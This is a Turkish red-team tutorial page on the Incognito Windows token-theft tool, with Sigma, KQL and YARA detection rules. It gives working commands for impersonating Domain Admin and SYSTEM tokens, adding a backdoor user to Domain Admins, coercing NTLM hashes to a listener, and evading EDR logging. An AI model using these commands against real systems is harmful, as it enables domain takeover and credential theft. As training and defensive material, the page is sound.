# Incognito

> **Kategori:** [9. ACL, GPO VE NESNE MANİPÜLASYONU (OBJECT, ACL & DELEGATION ABUSE)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Luke Jennings (MWR InfoSecurity) tarafından geliştirilen ve Metasploit/Meterpreter ile bağımsız ikili olarak kullanılan; Windows işletim sisteminde çalışan tüm süreçlerin Erişim Belirteçlerini (Access Tokens) listeleyen, hedef belirteci kopyalayarak (`DuplicateTokenEx`) başka bir kullanıcının (Domain Admin, SYSTEM vb.) kimliğine bürünen ve o belirteçle yeni süreç başlatan öncü belirteç hırsızlığı aracı.

---

## 1. Genel Bakış ve Amaç

Windows işletim sistemlerinde bir kullanıcının kimliği ve yetki sınırları **Erişim Belirteçleri (Access Tokens)** ile temsil edilir. Bir kullanıcı sisteme yerel olarak, RDP ile, SMB paylaşımı üzerinden, WMI ile veya zamanlanmış bir görev aracılığıyla bağlandığında Yerel Güvenlik Yetkilisi Alt Sistemi Servisi (`lsass.exe`) tarafından bir oturum ve ilişkili belirteç nesnesi oluşturulur.

Bir belirteç şu kritik bileşenleri içerir:
- **Kullanıcı SID'si:** Hesabın benzersiz kimliği (Örn: Domain Admin SID).
- **Grup SID'leri:** Kullanıcının üyesi olduğu tüm yerel ve etki alanı grupları (`Domain Admins`, `Administrators`, `Enterprise Admins`).
- **Ayrıcalıklar (Privileges):** Kullanıcıya tanınan özel Windows yetkileri (`SeDebugPrivilege`, `SeImpersonatePrivilege`, `SeBackupPrivilege` vb.).
- **Bütünlük Düzeyi (Integrity Level):** Medium, High, System.

Windows'ta iki temel belirteç türü bulunur:
1. **Birincil Belirteç (Primary Token):** Bir süreç başlatıldığında sürece atanan ana belirteçtir.
2. **Taklit Belirteci (Impersonation Token):** Bir iş parçacığının (Thread), kendisine bağlanan istemcinin yetkileriyle işlem yapabilmesi için geçici olarak büründüğü belirteçtir.

**`Incognito`**, Luke Jennings tarafından geliştirilen ve Windows'un bu çekirdek belirteç mimarisini istismar eden klasik ve çığır açıcı bir sömürü aracıdır. Sistemde yönetici veya `SYSTEM` yetkisine ulaşıldığında, bellekte o an aktif olan tüm süreç ve iş parçacıklarını tarar. Eğer hedef makinede (örneğin bir dosya sunucusu, jump-host veya veritabanı sunucusu) bir Domain Admin oturum açmışsa veya bir SMB bağlantısı bırakmışsa, Incognito bu belirteci doğrudan hafızadan kopyalar (`DuplicateTokenEx`). Parola sıfırlamaya, NTLM hash kırmaya veya Kerberos biletine ihtiyaç duymadan, saldırganın mevcut komut kabuğunu saniyeler içinde **Domain Admin** yetkisine yükseltir.

### Belirteç Yetki Seviyeleri ve Delegasyon

Incognito, belirteçleri iki ana kategoride sınıflandırır:
- **Delegation Tokens (Temsil Belirteçleri):** İstemcinin hem yerel makinede hem de ağdaki diğer etki alanı kaynaklarında (SMB, LDAP vb.) taklit edilmesine izin verir (`SecurityDelegation`). Yanal hareket için en değerli belirteçlerdir.
- **Impersonation Tokens (Taklit Belirteçleri):** Yalnızca yerel makinedeki kaynaklara erişim için geçerlidir (`SecurityImpersonation`); ağ üzerinden başka bir sunucuya kimlik doğrulamada kullanılamaz.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   HEDEF WINDOWS SUNUCUSU (YEREL YÖNETİCİ / SYSTEM)     │
│                                                                        │
│  [ incognito.exe list_tokens -u ]                                      │
│         │                                                              │
│         ├── (1) CreateToolhelp32Snapshot() ile Süreçler Taranır        │
│         │                                                              │
│         ├── (2) OpenProcess() + OpenProcessToken() Çağrılır:           │
│         │       PID 844  (explorer.exe)  ──► Token: CORP\jdoe          │
│         │       PID 1290 (taskhostw.exe) ──► Token: CORP\da_admin      │
│         │       PID 412  (spoolsv.exe)   ──► Token: NT AUTHORITY\SYSTEM│
│         │                                                              │
│         ▼                                                              │
│  [ incognito.exe execute -c "CORP\da_admin" cmd.exe ]                  │
│         │                                                              │
│         ├── (3) Hedef Süreçten Belirteç Alınır (TOKEN_DUPLICATE)       │
│         │                                                              │
│         ├── (4) DuplicateTokenEx() ile Birincil Belirteç Türetilir     │
│         │                                                              │
│         ├── (5) CreateProcessWithTokenW() veya ImpersonateLoggedOnUser │
│         │       ├── SeImpersonatePrivilege / SeAssignPrimaryToken      │
│         │       └── Yeni Süreç Başlatılır: cmd.exe                     │
│         │                                                              │
│         ▼                                                              │
│  [ ÇIKTI: Yeni cmd.exe Başlatıldı! Kullanıcı: CORP\da_admin ]          │
│  [ Ağ Paylaşımlarına (\\DC01\C$) Doğrudan Domain Admin Olarak Erişilir ]│
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Kriter | LSASS Bellek Dökümü (Mimikatz) | Belirteç Hırsızlığı (Incognito) |
|---|---|---|
| **LSASS Sürecine Müdahale** | `lsass.exe` sürecine handle açar; EDR anında alarm üretir ve süreci öldürür. | `lsass.exe` sürecine dokunmaz! Normal kullanıcı süreçlerindeki belirteçleri çalar. |
| **Parola / Hash İhtiyacı** | NTLM hash veya Kerberos bileti ayıklar; çevrimdışı kırma gerekebilir. | Hash veya parola gerekmez; bellekteki hazır canlı belirteç doğrudan giyilir. |
| **Credential Guard Engeli** | VBS / Credential Guard açıkken LSASS parolalarını korur. | Credential Guard süreç belirteçlerini korumaz; Incognito sorunsuz çalışır. |
| **Yanal Hareket Hızı** | Parola karmasını alıp Pass-the-Hash yapmak gerekir. | `Delegation Token` ele geçirildiği anda doğrudan ağ paylaşımlarına erişilir. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | Incognito | Tokenvator | Mimikatz (token) | Cobalt Strike (steal_token) |
|---|---|---|---|---|
| **Geliştirme Dili** | C/C++ (Native) | C# (.NET) | C Native | C Beacon Yerleşik |
| **Çalışma Platformu** | Bağımsız EXE / Metasploit | Bağımsız C# EXE | Mimikatz DLL | Beacon In-Memory |
| **Kullanım Kolaylığı** | Çok Yüksek (Basit Sözdizimi) | Orta (Ayrıntılı bayraklar) | Yüksek | Çok Yüksek (`steal_token <PID>`) |
| **Süreç Başlatma** | `CreateProcessWithTokenW` | `CreateProcessWithTokenW` | `token::elevate` | Süreç bürünme |
| **Kullanıcı Ekleme Yeteneği**| 🟢 Var (`add_user`) | 🔴 Yok | 🔴 Yok | 🔴 Yok |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Incognito, bağımsız komut satırı ikilisi (`incognito.exe`) veya Metasploit Meterpreter uzantısı (`load incognito`) olarak iki farklı şekilde çalıştırılabilir.

### Bağımsız İkili (`incognito.exe`) Sözdizimi

```cmd
incognito.exe <Komut> [Seçenekler]
```

### Desteklenen Kritik Komutlar ve Bayraklar

| Komut / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `list_tokens -u` | Bellekteki tüm belirteçleri kullanıcı adına göre listeler (Delegation ve Impersonation ayrımıyla). | `incognito.exe list_tokens -u` |
| `list_tokens -g` | Bellekteki tüm belirteçleri grup üyeliklerine göre gruplayarak listeler. | `incognito.exe list_tokens -g` |
| `execute -c "<Kullanıcı>" "<Komut>"` | Belirtilen kullanıcının belirtecini kopyalayarak yeni bir komut/süreç başlatır. | `incognito.exe execute -c "CORP\Administrator" cmd.exe` |
| `add_user <Domain> <Kullanıcı> <Parola>` | Ele geçirilen belirteç yetkisiyle etki alanına doğrudan yeni kullanıcı ekler. | `incognito.exe add_user corp.local backdoor Pass123!` |
| `add_group_user <Domain> <Grup> <Kullanıcı>` | Çalınan belirteç yetkisiyle kullanıcıyı belirtilen güvenlik grubuna ekler. | `incognito.exe add_group_user corp.local "Domain Admins" backdoor` |
| `snarf_hashes <Dinleyici_IP>` | Sistem belirteçlerini kullanarak SMB üzerinden NTLM karmalarını tetikler. | `incognito.exe snarf_hashes 10.10.10.50` |

### Metasploit / Meterpreter Konsol Sözdizimi

- `load incognito`: Incognito uzantısını Meterpreter oturumuna yükler.
- `list_tokens -u`: Oturumdaki kullanıcı belirteçlerini döker.
- `impersonate_token "CORP\\Administrator"`: Geçerli Meterpreter iş parçacığını hedef kullanıcıya büründürür.
- `rev2self`: Orijinal oturum kimliğine (SYSTEM / İlk kullanıcı) geri döner (Revert to Self).

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Bellekteki Belirteçlerin Taranması ve Durum Analizi

Yerel yönetici veya SYSTEM yetkisi elde edilmiş bir sunucuda o an çalınabilecek aktif kullanıcı belirteçlerini listelemek:

```cmd
incognito.exe list_tokens -u
```

**Örnek Konsol Çıktısı Analizi:**

```text
C:\Tools> incognito.exe list_tokens -u

[*] Searching for tokens...
[+] Found 4 token(s)!

[-] Delegation Tokens Available:
========================================
CORP\da_admin
CORP\srv_backup
NT AUTHORITY\SYSTEM

[-] Impersonation Tokens Available:
========================================
CORP\jdoe
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
```

*Çıktı Yorumu:* `Delegation Tokens` altında `CORP\da_admin` hesabı tespit edilmiştir. Bu belirteç hem yerel makinede hem de ağ paylaşımlarında tam yetkili kimlik doğrulaması yapabilir.

### Senaryo 2: Domain Admin Belirtecine Bürünerek Yetkili Komut Kabuğu Başlatma

Tespit edilen `CORP\da_admin` belirteci kopyalanarak yeni bir `cmd.exe` komut istemi başlatılması:

```cmd
incognito.exe execute -c "CORP\da_admin" cmd.exe
```

**Örnek Konsol Çıktısı:**

```text
[*] Attempting to execute 'cmd.exe' as 'CORP\da_admin'...
[+] Successfully duplicated token for 'CORP\da_admin'!
[+] Starting process with CreateProcessWithTokenW()...
[+] Process created successfully with PID: 3412!
```

Yeni açılan komut isteminde `whoami` yazıldığında kullanıcının `corp\da_admin` olduğu ve `dir \\dc01\c$` komutunun başarıyla çalıştığı görülür.

### Senaryo 3: Metasploit Meterpreter Üzerinde Incognito Kullanımı

Bir sunucuda Meterpreter oturumu açıkken Incognito ile yetki yükseltme ve geri alma döngüsü:

```text
meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > list_tokens -u
[-] Delegation Tokens Available
========================================
CORP\EnterpriseAdmin
NT AUTHORITY\SYSTEM

meterpreter > impersonate_token "CORP\\EnterpriseAdmin"
[+] Successfully impersonated user CORP\EnterpriseAdmin

meterpreter > getuid
Server username: CORP\EnterpriseAdmin

# Operasyon bittikten sonra orijinal kimliğe dön:
meterpreter > rev2self
[+] Successfully reverted to self
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Senaryo 4: Çalınan Belirteç ile Domain Admins Grubuna Arka Kapı Kullanıcısı Ekleme

Ayrıcalıklı belirteci kullanarak etki alanında kalıcılık sağlamak amacıyla yeni bir kullanıcı açıp gruba eklemek:

```cmd
incognito.exe add_user corp.local backdoor Pass123!
incognito.exe add_group_user corp.local "Domain Admins" backdoor
```

### Senaryo 5: SYSTEM Belirtecine Bürünerek Yerel Korumaları Aşma

Yerel yönetici (Local Admin) oturumundan işletim sisteminin en yüksek yetkisi olan `NT AUTHORITY\SYSTEM` belirtecine sıçramak:

```cmd
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
```

### Senaryo 6: Cobalt Strike Beacon İçinde Eşdeğer Token Manipülasyonu

Cobalt Strike üzerinde Incognito mantığı yerleşik `steal_token` komutu ile yürütülür:

```text
beacon> ps
# da_admin'e ait sürecin PID'si bulunur (Örn: 2984)
beacon> steal_token 2984
[+] Impersonated CORP\da_admin

# Ağ komutu çalıştırılır:
beacon> ls \\dc01\c$

# Temizlik:
beacon> rev2self
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Privilege not held: SeDebugPrivilege or SeImpersonatePrivilege` | Incognito orta bütünlük (Medium Integrity) seviyesindeki standart bir kullanıcı oturumunda çalıştırılmıştır. | Diğer süreçlerin belirteçlerini okumak için en az Yerel Yönetici (Yüksek Bütünlük / UAC Bypass) veya SYSTEM oturumu zorunludur. |
| `CreateProcessWithTokenW failed: Error 1314 / Privilege not held` | İşletim sisteminde "İkincil Oturum Açma" (`Secondary Logon - seclogon`) servisi durdurulmuş veya devre dışı bırakılmıştır. | Servis komut satırından başlatılmalıdır: `net start seclogon` veya `sc config seclogon start= auto`. |
| `No delegation tokens available / Token is only Impersonation` | Hedef kullanıcının belirteci `SecurityImpersonation` seviyesindedir; kullanıcı o an sisteme ağ kısıtlamalı bir protokolle bağlanmıştır. | Taklit belirteci yerel işlem yapabilir ancak ağ üzerinden DC'ye bağlanamaz. Farklı bir süreçteki `Delegation Token` hedeflenmeli veya `runas /netonly` kullanılmalıdır. |
| `Access is denied (Error 5) when opening process` | Hedef süreç `Protected Process Light (PPL)` (Örn: `lsass.exe`) veya Anti-Cheat/EDR tarafından korunmaktadır. | Korunan süreçler yerine korumasız kullanıcı süreçleri (`explorer.exe`, `taskhostw.exe`, `notepad.exe`) hedeflenmelidir. |
| `Token not found in memory` | Taklit edilmek istenen kullanıcı sunucudaki oturumunu tamamen kapatmış (Logoff) ve belirteci RAM'den temizlenmiştir. | Hedef yöneticinin sunucuda tekrar oturum açması beklenmeli veya Coerced Authentication ile sunucuya bağlantı tetiklenmelidir. |
| `Kerberos Double-Hop Problem` | Çalınan belirteç uzak sunucuya bağlanırken Kerberos yetki devri yapılandırması eksiktir (İki atlama sorunu). | Makinede Resource-Based Constrained Delegation (RBCD) yapılandırılmalı veya doğrudan NTLM kimlik doğrulama yöntemleri kullanılmalıdır. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ LSASS İzi ]       : 🟢 SIFIR (lsass.exe'ye handle açılmaz)         │
│  [ Ağ Portları ]     : 🟢 SIFIR (Tamamen yerel bellek operasyonu)     │
│  [ Olay Günlükleri ] : 🟡 ORTA (Event 4624 Type 9 ve Event 4673)      │
│  [ Süreç Hiyerarşisi]: 🔴 YÜKSEK (CreateProcessWithTokenW İmzası)      │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Windows Güvenlik Olay Günlükleri (Security Log):**
   - **Event ID 4624 (Logon Event):**
     - Belirteç kopyalandığında `LogonType: 9 (NewCredentials)` tetiklenebilir.
     - `ProcessInformation`: Süreci başlatan uygulamanın adı (`incognito.exe`).
   - **Event ID 4673 (Privileged Service Called):**
     - Başarısız veya şüpheli `SeAssignPrimaryTokenPrivilege` ve `SeImpersonatePrivilege` çağrıları loglara geçer.
2. **Sysmon Günlükleri:**
   - **Event ID 10 (ProcessAccess):** Bir sürecin sistemdeki onlarca farklı sürece `DesiredAccess: 0x1400` (`PROCESS_QUERY_INFORMATION`) ile handle açarak belirteç araması.
   - **Event ID 1 (Process Create):** Süreç hiyerarşisi anomalisi. Örneğin `incognito.exe` veya `svchost.exe` tarafından başlatılan bir `cmd.exe` sürecinin kullanıcı kimliğinin (`CORP\da_admin`) ana süreçten farklı olması.

### 5.2 Ağ ve EDR İmzaları

- **EDR Sezgisel Analizi:** Belirteç hırsızlığı (Token Stealing / Impersonation) modern EDR yazılımlarının davranışsal motorları (Behavioral Engine) tarafından yakından izlenir. Özellikle `SYSTEM` yetkisinden bir etki alanı yöneticisi belirtecine bürünülüp ağ bağlantısı açılması belirgin bir korelasyon kuralıdır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1134.001** | Access Token Manipulation: Token Impersonation/Theft | Bellekteki süreçlerden erişim belirteçlerinin kopyalanıp bürünülmesi. |
| **T1134.002** | Access Token Manipulation: Create Process with Token | Kopyalanan belirteç ile yeni komut kabuğu başlatılması. |
| **T1057** | Process Discovery | Sistemdeki tüm süreçlerin belirteç sahiplerini bulmak için taranması. |
| **T1078.002** | Valid Accounts: Domain Accounts | Çalınan belirteç kimliği ile etki alanı kaynaklarına erişim. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Tüm Süreçleri Tarama Gürültüsü** | `list_tokens -u` sistemdeki yüzlerce sürece aynı anda handle açar ve Sysmon Event 10 alarmı tetikler. Hedef kullanıcının PID'si biliniyorsa doğrudan spesifik PID'den belirteç kopyalayın (`steal_token <PID>`). |
| **İkincil Oturum Açma Hizmeti** | `CreateProcessWithTokenW` çağrısı `seclogon` servisini tetikler. Bunun yerine iş parçacığı seviyesinde taklit (`ImpersonateLoggedOnUser`) kullanan bellek içi teknikleri tercih edin. |
| **Kalıcı Kimlikte Kalma** | Ayrıcalıklı belirteçle işlem biter bitmez mutlaka `rev2self` komutunu çalıştırarak orijinal kimliğinize geri dönün. |
| **Diske Binary Yazma** | `incognito.exe` dosyasını diske indirmeyin; Cobalt Strike `steal_token` veya bellek içi çalışan C# muadillerini ([Tokenvator](./Tokenvator.md)) kullanın. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: Şüpheli Belirteç Manipülasyonu ve CreateProcessWithTokenW Tespiti

```yaml
title: Suspicious Access Token Impersonation and Process Creation
id: f71248a1-4912-4c20-a912-38910245fe01
status: experimental
description: Detects process executions indicative of Incognito or token manipulation tools creating processes with alternate credentials.
author: Modul 11 Security Research
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    CommandLine|contains:
      - 'incognito'
      - 'list_tokens'
      - 'impersonate_token'
      - 'execute -c'
  selection_parent:
    ParentImage|endswith: '\services.exe'
    Image|endswith: '\cmd.exe'
  condition: selection_img or selection_parent
falsepositives:
  - Legitimate administrative utilities utilizing Secondary Logon service
level: high
tags:
  - attack.defense_evasion
  - attack.privilege_escalation
  - attack.t1134.001
```

#### Microsoft Sentinel KQL Sorgusu: Anormal LogonType 9 ve Süreç Oluşturma Korelasyonu

```kql
// Kısa sürede LogonType 9 (NewCredentials) ile oturum açıp ardından yetkili süreç başlatan olaylar
SecurityEvent
| where TimeGenerated > ago(2h)
| where EventID == 4624 and LogonType == 9
| project LogonTime = TimeGenerated, TargetUserName, SubjectUserName, ProcessName, IpAddress
| join kind=inner (
    SecurityEvent
    | where TimeGenerated > ago(2h)
    | where EventID == 4688 and Process has_any ("cmd.exe", "powershell.exe")
    | project CmdTime = TimeGenerated, NewProcess = Process, CommandLine, ParentProcessName
) on $left.ProcessName == $right.ParentProcessName
| where CmdTime between (LogonTime .. (LogonTime + 2m))
| project LogonTime, CmdTime, TargetUserName, SubjectUserName, NewProcess, CommandLine
```

#### YARA Kuralı: Incognito Binary ve Metasploit Modülü İmzaları

```yara
rule PostExploit_Incognito_Tool {
    meta:
        description = "Detects standalone Incognito binary or Metasploit incognito extension"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "Incognito" ascii wide
        $s2 = "list_tokens" ascii wide
        $s3 = "impersonate_token" ascii wide
        $s4 = "Delegation Tokens Available" ascii wide
        $s5 = "Impersonation Tokens Available" ascii wide
        $s6 = "CreateProcessWithTokenW" ascii
    condition:
        all of ($s1, $s4, $s5) or (3 of ($s2, $s3, $s6))
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Kullanıcı Belirteçlerini Listeleme
```cmd
incognito.exe list_tokens -u
```
- **Ne Yapar?** Sistemde o an aktif olan tüm kullanıcı belirteçlerini Delegation ve Impersonation olarak listeler.
- **Ne Zaman Kullanılır?** Makinede hangi ayrıcalıklı hesapların oturum açtığını görmek için.
- **Parametreler:** `list_tokens -u`: Kullanıcı bazlı listeleme.

### Komut 2: Çalınan Belirteç ile Yeni Süreç Başlatma
```cmd
incognito.exe execute -c "CORP\Administrator" cmd.exe
```
- **Ne Yapar?** `CORP\Administrator` belirtecini kopyalayarak onun yetkileriyle yeni bir `cmd.exe` başlatır.
- **Ne Zaman Kullanılır?** Domain Admin belirteci yakalandığında yetkili komut kabuğu açmak için.
- **Parametreler:** `-c`: Hedef kullanıcı kimliği, `cmd.exe`: Çalıştırılacak ikili.

### Komut 3: Metasploit Üzerinde Belirtece Bürünme
```text
meterpreter > impersonate_token "CORP\\da_admin"
```
- **Ne Yapar?** Mevcut Meterpreter iş parçacığının kimliğini `CORP\da_admin` yapar.
- **Ne Zaman Kullanılır?** Meterpreter oturumunda anında Domain Admin olmak için.
- **Parametreler:** Hedef kullanıcının tırnak içinde tam adı.

### Komut 4: Orijinal Kimliğe Geri Dönme (Revert to Self)
```text
meterpreter > rev2self
```
- **Ne Yapar?** Taklit belirtecini bırakır ve oturumun orijinal kimliğine (SYSTEM / Admin) geri döner.
- **Ne Zaman Kullanılır?** Ayrıcalıklı belirteçle işlem bittiğinde iz bırakmamak için.
- **Parametreler:** Parametre almaz.

### Komut 5: Grup Bazlı Belirteç Taraması
```cmd
incognito.exe list_tokens -g
```
- **Ne Yapar?** Belirteçleri kullanıcı adları yerine dahil oldukları güvenlik gruplarına göre listeler.
- **Ne Zaman Kullanılır?** Hangi belirtecin `Domain Admins` veya `Server Operators` yetkisine sahip olduğunu görmek için.
- **Parametreler:** `-g`: Grup bazlı gruplama.

### Komut 6: Çalınan Belirteç ile Etki Alanına Kullanıcı Ekleme
```cmd
incognito.exe add_user corp.local backdoor SecretPass123!
```
- **Ne Yapar?** Taklit edilen yönetici belirteciyle Active Directory etki alanına yeni kullanıcı açar.
- **Ne Zaman Kullanılır?** Etki alanında hızlı kalıcılık hesabı oluşturmak için.
- **Parametreler:** `corp.local`: Etki alanı, `backdoor`: Kullanıcı adı, `SecretPass123!`: Parola.

### Komut 7: Kullanıcıyı Domain Admins Grubuna Ekleme
```cmd
incognito.exe add_group_user corp.local "Domain Admins" backdoor
```
- **Ne Yapar?** Açılan kullanıcıyı doğrudan `Domain Admins` grubunun tam yetkili üyesi yapar.
- **Ne Zaman Kullanılır?** Kalıcılık hesabını en üst yetki seviyesine yükseltmek için.
- **Parametreler:** Hedef grup ve kullanıcı adı.

### Komut 8: SYSTEM Belirtecine Yükselme
```cmd
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
```
- **Ne Yapar?** Yerel yönetici oturumundan işletim sisteminin çekirdek `SYSTEM` belirtecine sıçrar.
- **Ne Zaman Kullanılır?** Yerel güvenlik kısıtlamalarını ve dosya izinlerini aşmak için.
- **Parametreler:** `NT AUTHORITY\SYSTEM`: Hedef çekirdek kimliği.

### Komut 9: Cobalt Strike Tekil PID'den Belirteç Kopyalama
```text
beacon> steal_token 1420
```
- **Ne Yapar?** Belirtilen PID'ye sahip sürecin belirtecini çalarak Beacon oturumuna giydirir.
- **Ne Zaman Kullanılır?** Tüm süreçleri taramadan tekil ve sessiz belirteç hırsızlığı yapmak için.
- **Parametreler:** Hedef sürecin Process ID numarası.

### Komut 10: Çalınan Belirteç ile Ağ Paylaşımını Doğrulama
```cmd
incognito.exe execute -c "CORP\da_admin" "cmd.exe /c dir \\dc01\c$ > C:\Users\Public\loot.txt"
```
- **Ne Yapar?** Domain Admin belirteciyle arka planda DC'nin C$ paylaşımını listeler ve dosyaya yazar.
- **Ne Zaman Kullanılır?** Görsel pencere açmadan arka planda sessizce erişimi test etmek için.
- **Parametreler:** Komut satırı argümanı yönlendirmesi.

---

## Kaynaklar

- **Resmi Araştırma Makalesi:** [Luke Jennings / MWR InfoSecurity Incognito Whitepaper](https://labs.f-secure.com/)
- **Metasploit Incognito Dokümantasyonu:** [Rapid7 Meterpreter Incognito Extension](https://docs.metasploit.com/)
- **Microsoft Win32 API Dokümantasyonu:** [Access Tokens and Impersonation Levels](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- **MITRE ATT&CK Referansı:** [T1134.001 - Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/)

---

> **Önceki:** [← dsacls](./dsacls.md) · **Sonraki:** [Tokenvator →](./Tokenvator.md)
